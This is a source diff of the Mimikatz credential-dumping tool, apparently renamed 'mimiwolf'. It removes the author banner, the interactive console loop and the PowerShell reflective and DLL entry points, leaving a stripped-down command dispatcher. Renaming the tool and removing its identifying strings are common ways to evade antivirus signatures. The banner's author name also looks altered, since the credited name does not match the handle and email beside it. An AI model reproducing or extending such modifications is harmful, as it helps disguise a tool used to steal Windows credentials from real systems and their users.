@@ -34,29 +34,14 @@ int wmain(int argc, wchar_t * argv[])
 {
 	NTSTATUS status = STATUS_SUCCESS;
 	int i;
-#if !defined(_POWERKATZ)
-	size_t len;
-	wchar_t input[0xffff];
-#endif
+
 	mimiwolf_begin();
 	for(i = mimiwolf_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING) ; i++)
 	{
 		kprintf(L"\n" mimiwolf L"(" mimiwolf_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
 		status = mimiwolf_dispatchCommand(argv[i]);
 	}
-#if !defined(_POWERKATZ)
-	while ((status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING))
-	{
-		kprintf(L"\n" mimiwolf L" # "); fflush(stdin);
-		if(fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n'))
-		{
-			if(input[len - 1] == L'\n')
-				input[len - 1] = L'\0';
-			kprintf_inputline(L"%s\n", input);
-			status = mimiwolf_dispatchCommand(input);
-		}
-	}
-#endif
+
 	mimiwolf_end(status);
 	return STATUS_SUCCESS;
 }
@@ -64,32 +49,14 @@ int wmain(int argc, wchar_t * argv[])
 void mimiwolf_begin()
 {
 	kull_m_output_init();
-#if !defined(_POWERKATZ)
-	SetConsoleTitle(mimiwolf L" " mimiwolf_VERSION L" " mimiwolf_ARCH L" (oe.eo)");
-	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
-#endif
-	kprintf(L"\n"
-		L"  .#####.   " mimiwolf_FULL L"\n"
-		L" .## ^ ##.  " mimiwolf_SECOND L" - (oe.eo)\n"
-		L" ## / \\ ##  /*** Victor CHAN `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
-		L" ## \\ / ##       > https://blog.gentilkiwi.com/mimiwolf\n"
-		L" '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n"
-		L"  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n");
+	kprintf(L"\nbanner\n");
 	mimiwolf_initOrClean(TRUE);
 }
 
 void mimiwolf_end(NTSTATUS status)
 {
 	mimiwolf_initOrClean(FALSE);
-#if !defined(_POWERKATZ)
-	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
-#endif
 	kull_m_output_clean();
-#if !defined(_WINDLL)
-	if(status == STATUS_THREAD_IS_TERMINATING)
-		ExitThread(STATUS_SUCCESS);
-	else ExitProcess(STATUS_SUCCESS);
-#endif
 }
 
 BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
@@ -113,10 +80,7 @@ NTSTATUS mimiwolf_initOrClean(BOOL Init)
 		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
 		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
 		if(FAILED(hr))
-#if defined(_POWERKATZ)
-			if(hr != RPC_E_CHANGED_MODE)
-#endif
-				PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
+			PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
 		kull_m_asn1_init();
 	}
 	else
@@ -231,49 +195,6 @@ NTSTATUS mimiwolf_doLocal(wchar_t * input)
 	}
 	return status;
 }
-
-#if defined(_POWERKATZ)
-__declspec(dllexport) wchar_t * powershell_reflective_mimiwolf(LPCWSTR input)
-{
-	int argc = 0;
-	wchar_t ** argv;
-	
-	if(argv = CommandLineToArgvW(input, &argc))
-	{
-		outputBufferElements = 0xff;
-		outputBufferElementsPosition = 0;
-		if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
-			wmain(argc, argv);
-		LocalFree(argv);
-	}
-	return outputBuffer;
-}
-#endif
-
-#if defined(_WINDLL)
-void CALLBACK mimiwolf_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow)
-{
-	int argc = 0;
-	wchar_t ** argv;
-
-	AllocConsole();
-#pragma warning(push)
-#pragma warning(disable:4996)
-	freopen("CONOUT$", "w", stdout);
-	freopen("CONOUT$", "w", stderr);
-	freopen("CONIN$", "r", stdin);
-#pragma warning(pop)
-	if(lpszCmdLine && lstrlenW(lpszCmdLine))
-	{
-		if(argv = CommandLineToArgvW(lpszCmdLine, &argc))
-		{
-			wmain(argc, argv);
-			LocalFree(argv);
-		}
-	}
-	else wmain(0, NULL);
-}
-#endif
 
 FARPROC WINAPI delayHookFailureFunc (unsigned int dliNotify, PDelayLoadInfo pdli)
 {
